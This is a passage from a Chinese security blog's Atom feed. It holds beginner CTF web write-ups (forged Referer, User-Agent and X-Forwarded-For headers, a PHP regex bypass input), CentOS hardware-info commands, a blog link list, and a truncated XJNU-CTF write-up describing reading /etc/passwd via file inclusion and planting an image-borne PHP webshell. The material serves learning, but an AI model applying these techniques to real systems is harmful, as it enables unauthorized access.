src="https://upload-images.jianshu.io/upload_images/8166147-fb54be5cf1922c25.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>抓取数据包</p><p><img src="https://upload-images.jianshu.io/upload_images/8166147-3a8f12183b201f3a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><ul><li>题目分析：这么明显的提示，就是伪造IP头部了，又加之提示信息<code>不是从d0g3.cn来的你还想要flag？</code>，很容易拿到flag。</li></ul><ul><li>解题方法：伪造数据包头</li></ul><p><img src="https://upload-images.jianshu.io/upload_images/8166147-e24d2547fa836c68.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><pre><code>Referer: d0g3.cn</code></pre><hr><h6 id="12-Firefox"><a href="#12-Firefox" class="headerlink" title="12. Firefox"></a>12. Firefox</h6><ul><li>题目地址：<a href="http://106.12.21.77:8080/firefox.php">http://106.12.21.77:8080/firefox.php</a></li></ul><p><img src="https://upload-images.jianshu.io/upload_images/8166147-49419540f2d45cef.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><img src="https://upload-images.jianshu.io/upload_images/8166147-df077c822f67d430.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><img src="https://upload-images.jianshu.io/upload_images/8166147-3de00b20d5a9b97c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="12"></p><ul><li>题目分析：看起来也很简单，就是伪造浏览器版本信息吧。</li><li>解题方法：修改浏览器版本信息为<code>Mozilla/11.0</code>，开始简单改个数字11，结果不行，后来仔细看提示，说只用构造为<code>Mozilla/11.0</code>，不用构造操作系统和协议。</li></ul><p><img src="https://upload-images.jianshu.io/upload_images/8166147-61862e5585796de5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><hr><h6 id="13-IP伪造"><a href="#13-IP伪造" class="headerlink" title="13. IP伪造"></a>13. IP伪造</h6><ul><li>题目地址：<a href="http://106.12.21.77:8080/x-forwarded-for.php">http://106.12.21.77:8080/x-forwarded-for.php</a></li></ul><p><img src="https://upload-images.jianshu.io/upload_images/8166147-9896280dd88a5e88.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><img src="https://upload-images.jianshu.io/upload_images/8166147-f439c256edee716e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><ul><li>题目分析：很简单了，伪造IP<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Client-Ip: 127.0.0.1</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">Host: 127.0.0.1</span><br></pre></td></tr></table></figure></li><li>解题方法：抓取数据包修改数据包IP地址</li></ul><p><img src="https://upload-images.jianshu.io/upload_images/8166147-c0a3e72c6121fa0a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><hr><h6 id="15-Match-it！-匹配它"><a href="#15-Match-it！-匹配它" class="headerlink" title="15. Match it！(匹配它)"></a>15. Match it！(匹配它)</h6><ul><li>题目地址：<a href="http://206.189.214.99:1080/Pr3g_m4atch1/Pr3g_m4atch1.php">http://206.189.214.99:1080/Pr3g_m4atch1/Pr3g_m4atch1.php</a></li></ul><p><img src="https://upload-images.jianshu.io/upload_images/8166147-4875386989135c3c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><pre><code>&lt;?phpinclude &#39;f1agi3hEre.php&#39;;if  (&quot;POST&quot; == $_SERVER[&#39;REQUEST_METHOD&#39;])&#123;    $password = $_POST[&#39;password&#39;];    if (0 &gt;= preg_match(&#39;/^[[:graph:]]&#123;12,&#125;$/&#39;, $password))    &#123;        echo &#39;Wrong Format&#39;;        exit;    &#125;    while (TRUE)    &#123;        $reg = &#39;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&#39;;        if (6 &gt; preg_match_all($reg, $password, $arr))            break;        $c = 0;        $ps = array(&#39;punct&#39;, &#39;digit&#39;, &#39;upper&#39;, &#39;lower&#39;);        foreach ($ps as $pt)        &#123;            if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password))            $c += 1;        &#125;        if ($c &lt; 3) break;        if (&quot;42&quot; == $password) echo $flag;        else echo &#39;Wrong password&#39;;        exit;    &#125;&#125;highlight_file(__FILE__);?&gt;</code></pre><ul><li>题目分析：一步一步代码审计吧。</li></ul><p>解析如下：</p><pre><code>0 &gt;= preg_match(&#39;/^[[:graph:]]&#123;12,&#125;$/&#39;, $password)  //输入的内容必须为12个以上包括12，不包括空格和tab键 $reg = &#39;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&#39;; //[[:punct:]] 任何标点符号， [[:digit:]] 任何数字， [[:upper:]] 任何大写字母 ， [[:lower:]] 任何小写字母 if (6 &gt; preg_match_all($reg, $password, $arr))//匹配到的次数要大于6次才能绕过。连续的大写或小写字母都只能算是一次。 $ps = array(&#39;punct&#39;, &#39;digit&#39;, &#39;upper&#39;, &#39;lower&#39;);        foreach ($ps as $pt)        &#123;            if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password))            $c += 1;        &#125;        if ($c &lt; 3) break;//这个好理解，必须要有大小写字母，数字，字符内容三种与三种以上if (&quot;42&quot; == $password) echo $flag;//最后输入的值还要和42相等。</code></pre><ul><li>解题方法：根据以上匹配规则构造出满足需求的payload</li></ul><p><em>可以构造420.000000e-1     //0可以随意添加不影响数值，但是要超过12个字符</em></p><p><img src="https://upload-images.jianshu.io/upload_images/8166147-952faca1ef4e0cf2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><hr><p>太菜了，其他的有点思路但暂时没搞定。</p>]]></content>
    
    
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;p&gt;&lt;em&gt;今天在网上找到一个CTF的小游戏，题目我做了几道感觉挺简单，很适合入门，之前了解CTF，参加各种杯或者是看各种比赛题的writeup，感觉太难了，想到这我还是决定从点滴做起，记录一下学习过程，同时也想做一套CTF从入门到精通的教程。&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;网址：&lt;a href=&quot;http://ctf.d0g3.cn/&quot;&gt;http://ctf.d0g3.cn/&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://zzqsmile.github.io/categories/CTF/"/>
    
    
    <category term="CTF" scheme="http://zzqsmile.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>优秀博客文章笔记</title>
    <link href="http://zzqsmile.github.io/2018/10/08/%E5%85%B6%E4%BB%96/%E4%BC%98%E7%A7%80%E5%8D%9A%E5%AE%A2%E9%93%BE%E6%8E%A5%E6%94%B6%E8%97%8F/"/>
    <id>http://zzqsmile.github.io/2018/10/08/%E5%85%B6%E4%BB%96/%E4%BC%98%E7%A7%80%E5%8D%9A%E5%AE%A2%E9%93%BE%E6%8E%A5%E6%94%B6%E8%97%8F/</id>
    <published>2018-10-08T01:00:00.000Z</published>
    <updated>2019-04-04T13:51:30.000Z</updated>
    
    <content type="html"><![CDATA[<p><strong>本片文章主要对网上比较好的博客博主网站做个笔记，也算快速导航吧，方便学习</strong></p><a id="more"></a><h5 id="大佬博客"><a href="#大佬博客" class="headerlink" title="大佬博客"></a>大佬博客</h5><blockquote><p>reber</p></blockquote><p>简书：<br><a href="https://www.jianshu.com/u/cc008b01f306">https://www.jianshu.com/u/cc008b01f306</a></p><p>个人：<br><a href="http://wyb0.com/">http://wyb0.com/</a></p><p>github:<br><a href="https://github.com/reber0">https://github.com/reber0</a></p><hr><blockquote><p>离别歌</p></blockquote><p><a href="https://www.leavesongs.com/">https://www.leavesongs.com/</a></p><hr><p><strong>友情链接</strong></p><blockquote><p>zksmile</p></blockquote><p>简书：<br><a href="https://www.jianshu.com/u/49a7ed0ab6a3">https://www.jianshu.com/u/49a7ed0ab6a3</a></p><p>个人：<br><a href="http://zksmile.me/">http://zksmile.me/</a></p><hr><blockquote><p>Climber</p></blockquote><p>giyhub: <a href="http://lawlietweb.com/">http://lawlietweb.com/</a></p><hr><blockquote><p>moxiaoxii<br><a href="http://momomoxiaoxi.com/2016/10/22/Websecurity/">http://momomoxiaoxi.com/2016/10/22/Websecurity/</a></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;strong&gt;本片文章主要对网上比较好的博客博主网站做个笔记，也算快速导航吧，方便学习&lt;/strong&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="其他" scheme="http://zzqsmile.github.io/categories/%E5%85%B6%E4%BB%96/"/>
    
    
    <category term="其他" scheme="http://zzqsmile.github.io/tags/%E5%85%B6%E4%BB%96/"/>
    
  </entry>
  
  <entry>
    <title>Linux CentOS查看硬件信息大全</title>
    <link href="http://zzqsmile.github.io/2018/10/03/%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8/Linux_CentOS%E6%9F%A5%E7%9C%8B%E7%A1%AC%E4%BB%B6%E4%BF%A1%E6%81%AF%E5%A4%A7%E5%85%A8/"/>
    <id>http://zzqsmile.github.io/2018/10/03/%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8/Linux_CentOS%E6%9F%A5%E7%9C%8B%E7%A1%AC%E4%BB%B6%E4%BF%A1%E6%81%AF%E5%A4%A7%E5%85%A8/</id>
    <published>2018-10-03T01:00:00.000Z</published>
    <updated>2018-10-03T09:59:22.000Z</updated>
    
    <content type="html"><![CDATA[<p><strong>今天总结一下在安全运维中对于硬件信息收集过程会用到的linux命令。</strong></p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">演示环境：CentOS 7</span><br></pre></td></tr></table></figure><p><strong>1.CentOS常用命令查看 CPU</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# more &#x2F;proc&#x2F;cpuinfo | grep &quot;model name&quot;</span><br><span class="line">model name    : Intel(R) Core(TM) i5-4210U CPU @ 1.70GHz</span><br><span class="line">[root@localhost ~]# </span><br></pre></td></tr></table></figure><p><strong>2.CentOS常用命令查看内存</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# free -m</span><br><span class="line">              total        used        free      shared  buff&#x2F;cache   available</span><br><span class="line">Mem:            976         678          70           3         227          82</span><br><span class="line">Swap:          2047           4        2043</span><br><span class="line">[root@localhost ~]#</span><br></pre></td></tr></table></figure><p><strong>3.CentOS常用命令查看cpu是32位还是64位​</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# getconf LONG_BIT</span><br><span class="line">64</span><br><span class="line">[root@localhost ~]#</span><br></pre></td></tr></table></figure><p><strong>4.使用CentOS常用命令查看当前linux的版本​</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# cat &#x2F;etc&#x2F;redhat-release </span><br><span class="line">CentOS Linux release 7.4.1708 (Core) </span><br><span class="line">[root@localhost ~]#</span><br></pre></td></tr></table></figure><p><strong>5.使用CentOS常用命令查看内核版本​</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# uname -a</span><br><span class="line">Linux localhost.localdomain 3.10.0-693.el7.x86_64 #1 SMP Tue Aug 22 21:09:27 UTC 2017 x86_64 x86_64 x86_64 GNU&#x2F;Linux</span><br><span class="line">[root@localhost ~]# uname -r</span><br><span class="line">3.10.0-693.el7.x86_64</span><br><span class="line">[root@localhost ~]# </span><br></pre></td></tr></table></figure><p><strong>6.使用CentOS常用命令查看硬盘和分区​​</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# df -h</span><br><span class="line">文件系统                 容量  已用  可用 已用% 挂载点</span><br><span class="line">&#x2F;dev&#x2F;mapper&#x2F;centos-root   17G  8.0G  9.1G   47% &#x2F;</span><br><span class="line">devtmpfs                 473M     0  473M    0% &#x2F;dev</span><br><span class="line">tmpfs                    489M     0  489M    0% &#x2F;dev&#x2F;shm</span><br><span class="line">tmpfs                    489M  7.2M  482M    2% &#x2F;run</span><br><span class="line">tmpfs                    489M     0  489M    0% &#x2F;sys&#x2F;fs&#x2F;cgroup</span><br><span class="line">&#x2F;dev&#x2F;sda1               1014M  161M  854M   16% &#x2F;boot</span><br><span class="line">tmpfs                     98M  4.0K   98M    1% &#x2F;run&#x2F;user&#x2F;42</span><br><span class="line">tmpfs                     98M   36K   98M    1% &#x2F;run&#x2F;user&#x2F;0</span><br><span class="line">&#x2F;dev&#x2F;sr0                 4.3G  4.3G     0  100% &#x2F;run&#x2F;media&#x2F;root&#x2F;CentOS 7 x86_64</span><br><span class="line">[root@localhost ~]#</span><br></pre></td></tr></table></figure><p><strong>7.使用CentOS常用命令查看selinux情况​</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# sestatus </span><br><span class="line">SELinux status:                 enabled</span><br><span class="line">SELinuxfs mount:                &#x2F;sys&#x2F;fs&#x2F;selinux</span><br><span class="line">SELinux root directory:         &#x2F;etc&#x2F;selinux</span><br><span class="line">Loaded policy name:             targeted</span><br><span class="line">Current mode:                   enforcing</span><br><span class="line">Mode from config file:          enforcing</span><br><span class="line">Policy MLS status:              enabled</span><br><span class="line">Policy deny_unknown status:     allowed</span><br><span class="line">Max kernel policy version:      28</span><br><span class="line">[root@localhost ~]# </span><br></pre></td></tr></table></figure><p><strong>8.查看IP地址</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# ifconfig</span><br></pre></td></tr></table></figure><p><strong>9.使用CentOS常用命令查看所属时区和是否使用UTC时间</strong></p><ul><li>CentOS 7查看方法：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# timedatectl </span><br><span class="line">      Local time: 三 2018-10-03 17:17:22 UTC</span><br><span class="line">  Universal time: 三 2018-10-03 17:17:22 UTC</span><br><span class="line">        RTC time: 三 2018-10-03 17:17:22</span><br><span class="line">       Time zone: Universal (UTC, +0000)</span><br><span class="line">     NTP enabled: no</span><br><span class="line">NTP synchronized: no</span><br><span class="line"> RTC in local TZ: no</span><br><span class="line">      DST active: n&#x2F;a</span><br><span class="line">[root@localhost ~]# date </span><br><span class="line">2018年 10月 03日 星期三 17:17:39 UTC</span><br><span class="line">[root@localhost ~]# timedatectl set-timezone Asia&#x2F;Shanghai</span><br><span class="line">[root@localhost ~]# timedatectl </span><br><span class="line">      Local time: 四 2018-10-04 01:18:46 CST</span><br><span class="line">  Universal time: 三 2018-10-03 17:18:46 UTC</span><br><span class="line">        RTC time: 三 2018-10-03 17:18:46</span><br><span class="line">       Time zone: Asia&#x2F;Shanghai (CST, +0800)</span><br><span class="line">     NTP enabled: no</span><br><span class="line">NTP synchronized: no</span><br><span class="line"> RTC in local TZ: no</span><br><span class="line">      DST active: n&#x2F;a</span><br><span class="line">[root@localhost ~]# date </span><br><span class="line">2018年 10月 04日 星期四 01:20:02 CST</span><br><span class="line">[root@localhost ~]# rm -rf &#x2F;etc&#x2F;localtime </span><br><span class="line">[root@localhost ~]# ln -s &#x2F;usr&#x2F;share&#x2F;zoneinfo&#x2F;Universal &#x2F;etc&#x2F;localtime</span><br><span class="line">[root@localhost ~]# timedatectl </span><br><span class="line">      Local time: 三 2018-10-03 17:22:44 UTC</span><br><span class="line">  Universal time: 三 2018-10-03 17:22:44 UTC</span><br><span class="line">        RTC time: 三 2018-10-03 17:22:43</span><br><span class="line">       Time zone: Universal (UTC, +0000)</span><br><span class="line">     NTP enabled: no</span><br><span class="line">NTP synchronized: no</span><br><span class="line"> RTC in local TZ: no</span><br><span class="line">      DST active: n&#x2F;a</span><br><span class="line">[root@localhost ~]# date </span><br><span class="line">2018年 10月 03日 星期三 17:22:51 UTC</span><br><span class="line">[root@localhost ~]# </span><br></pre></td></tr></table></figure><ul><li>CentOS 6查看方法：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># cat &#x2F;etc&#x2F;sysconfig&#x2F;clock</span><br></pre></td></tr></table></figure><p><strong>10.使用CentOS常用命令查看主机名​</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# hostname</span><br><span class="line">localhost.localdomain</span><br><span class="line">[root@localhost ~]# </span><br></pre></td></tr></table></figure><p><strong>11.使用CentOS常用命令查看开机运行时间</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# uptime </span><br><span class="line"> 16:49:14 up  2:22,  2 users,  load average: 0.00, 0.01, 0.05</span><br><span class="line">[root@localhost ~]# </span><br></pre></td></tr></table></figure><p><strong>12.查看主板信息</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# dmidecode | more</span><br><span class="line"># dmidecode 3.0</span><br><span class="line">Getting SMBIOS data from sysfs.</span><br><span class="line">SMBIOS 2.7 present.</span><br><span class="line">620 structures occupying 29060 bytes.</span><br><span class="line">Table at 0x000E0010.</span><br><span class="line"></span><br><span class="line">Handle 0x0000, DMI type 0, 24 bytes</span><br><span class="line">BIOS Information</span><br><span class="line">    Vendor: Phoenix Technologies LTD</span><br><span class="line">    Version: 6.00</span><br><span class="line">    Release Date: 05&#x2F;19&#x2F;2017</span><br><span class="line">    Address: 0xEA520</span><br><span class="line">    Runtime Size: 88800 bytes</span><br><span class="line">    ROM Size: 64 kB</span><br><span class="line">    Characteristics:</span><br><span class="line">        ISA is supported</span><br><span class="line">        PCI is supported</span><br><span class="line">        PC Card (PCMCIA) is supported</span><br><span class="line">        PNP is supported</span><br><span class="line">        APM is supported</span><br><span class="line">        BIOS is upgradeable</span><br><span class="line">        BIOS shadowing is allowed</span><br><span class="line">        ESCD support is available</span><br><span class="line">        Boot from CD is supported</span><br><span class="line">        Selectable boot is supported</span><br><span class="line">        EDD is supported</span><br><span class="line">        Print screen service is supported (int 5h)</span><br><span class="line">        8042 keyboard services are supported (int 9h)</span><br><span class="line">        Serial services are supported (int 14h)</span><br><span class="line">        Printer services are supported (int 17h)</span><br><span class="line">        CGA&#x2F;mono video services are supported (int 10h)</span><br><span class="line">        ACPI is supported</span><br><span class="line">        Smart battery is supported</span><br><span class="line">        BIOS boot specification is supported</span><br><span class="line">        Function key-initiated network boot is supported</span><br><span class="line">        Targeted content distribution is supported</span><br><span class="line">--More--</span><br></pre></td></tr></table></figure><p><strong>13.查看磁盘使用情况</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# fdisk -l</span><br><span class="line"></span><br><span class="line">磁盘 &#x2F;dev&#x2F;sda：21.5 GB, 21474836480 字节，41943040 个扇区</span><br><span class="line">Units &#x3D; 扇区 of 1 * 512 &#x3D; 512 bytes</span><br><span class="line">扇区大小(逻辑&#x2F;物理)：512 字节 &#x2F; 512 字节</span><br><span class="line">I&#x2F;O 大小(最小&#x2F;最佳)：512 字节 &#x2F; 512 字节</span><br><span class="line">磁盘标签类型：dos</span><br><span class="line">磁盘标识符：0x000d1bd6</span><br><span class="line"></span><br><span class="line">   设备 Boot      Start         End      Blocks   Id  System</span><br><span class="line">&#x2F;dev&#x2F;sda1   *        2048     2099199     1048576   83  Linux</span><br><span class="line">&#x2F;dev&#x2F;sda2         2099200    41943039    19921920   8e  Linux LVM</span><br><span class="line"></span><br><span class="line">磁盘 &#x2F;dev&#x2F;mapper&#x2F;centos-root：18.2 GB, 18249416704 字节，35643392 个扇区</span><br><span class="line">Units &#x3D; 扇区 of 1 * 512 &#x3D; 512 bytes</span><br><span class="line">扇区大小(逻辑&#x2F;物理)：512 字节 &#x2F; 512 字节</span><br><span class="line">I&#x2F;O 大小(最小&#x2F;最佳)：512 字节 &#x2F; 512 字节</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">磁盘 &#x2F;dev&#x2F;mapper&#x2F;centos-swap：2147 MB, 2147483648 字节，4194304 个扇区</span><br><span class="line">Units &#x3D; 扇区 of 1 * 512 &#x3D; 512 bytes</span><br><span class="line">扇区大小(逻辑&#x2F;物理)：512 字节 &#x2F; 512 字节</span><br><span class="line">I&#x2F;O 大小(最小&#x2F;最佳)：512 字节 &#x2F; 512 字节</span><br><span class="line"></span><br><span class="line">[root@localhost ~]# </span><br></pre></td></tr></table></figure><p>参考文章：<a href="http://zone.secevery.com/article/995">http://zone.secevery.com/article/995</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;strong&gt;今天总结一下在安全运维中对于硬件信息收集过程会用到的linux命令。&lt;/strong&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="运维安全" scheme="http://zzqsmile.github.io/categories/%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="运维安全" scheme="http://zzqsmile.github.io/tags/%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>信息收集笔记</title>
    <link href="http://zzqsmile.github.io/2018/09/27/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>http://zzqsmile.github.io/2018/09/27/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
    <published>2018-09-27T01:00:00.000Z</published>
    <updated>2019-03-27T08:11:56.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>主要收录信息收集方法及传送门</p></blockquote><ul><li><strong>FOCA信息收集神器</strong></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1. FOCA</span><br><span class="line">下载地址：https:&#x2F;&#x2F;github.com&#x2F;ElevenPaths&#x2F;FOCA&#x2F;releases </span><br><span class="line"></span><br><span class="line">2. 需要SQL Server环境</span><br><span class="line">下载地址：https:&#x2F;&#x2F;www.microsoft.com&#x2F;en-us&#x2F;sql-server&#x2F;sql-server-editions-express</span><br><span class="line"></span><br><span class="line">3. 需要.NET Framework 4.0</span><br><span class="line">下载地址：https:&#x2F;&#x2F;www.microsoft.com&#x2F;en-us&#x2F;download&#x2F;details.aspx?id&#x3D;17851</span><br></pre></td></tr></table></figure><p><a href="https://mp.weixin.qq.com/s/68o65Qn2oQuYpUtakvhGcQ">参考</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;主要收录信息收集方法及传送门&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;FOCA信息收集神器&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://zzqsmile.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
  </entry>
  
  <entry>
    <title>XJNU-CTF 2018</title>
    <link href="http://zzqsmile.github.io/2018/09/25/CTF/XJNU-CTF_2018/"/>
    <id>http://zzqsmile.github.io/2018/09/25/CTF/XJNU-CTF_2018/</id>
    <published>2018-09-25T01:00:00.000Z</published>
    <updated>2018-11-26T06:38:02.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>闲来无事，最近在做CTF题，感觉再不练练手我就废了。</p></blockquote><a id="more"></a><h4 id="1-本地文件包含-文件上传拿flag"><a href="#1-本地文件包含-文件上传拿flag" class="headerlink" title="1.本地文件包含+文件上传拿flag"></a>1.本地文件包含+文件上传拿<code>flag</code></h4><ul><li>地址题目：<a href="http://ctf.xjnu.edu.cn:666/">http://ctf.xjnu.edu.cn:666/ </a></li></ul><p><img src="http://qiniuyun.zzqsmile.top/blog/180925/bkE9kmhaHi.bmp?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p><ul><li>题目分析：</li></ul><blockquote><p>看到题目，有两种思路：1).利用文件上传拿<code>webshell</code>，然后找到<code>flag</code>; 2).利用文件包含拿<code>webshell</code>，然后找到<code>flag</code>。 目标很明确，思路也有，然后实践操作，结果发现文件上传走不通，然后想利用文件包含漏洞可以读文件，经证实的确可以读取到文件，但是要找<code>flag</code>就比较难了，因为我不知道<code>flag</code>在哪啊！于是就有另一种想法，利用远程文件包含拿<code>webshell</code>，后来经读<code>upload.php</code>源码发现，应该是不能远程文件包含的。那么最后就剩本地文件包含了，正好呢此处可以上传文件，因此先上传一个图片，不过图片内容改为一句话木马，然后包含这个图片，此时图片里面的一句话木马就会被解析执行，这样我们就拿到了<code>webshell</code>.</p></blockquote><p><strong>具体操作如下，正好回顾下基础知识</strong></p><ul><li>利用文件包含读本地文件<code>/etc/passwd</code></li></ul><p><img src="http://qiniuyun.zzqsmile.top/blog/180925/8C3eb1dEFI.bmp?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p><ul><li>由于最后知道了<code>flag</code>文件名和路径，这里就顺便演示下，如下：</li></ul><p><img 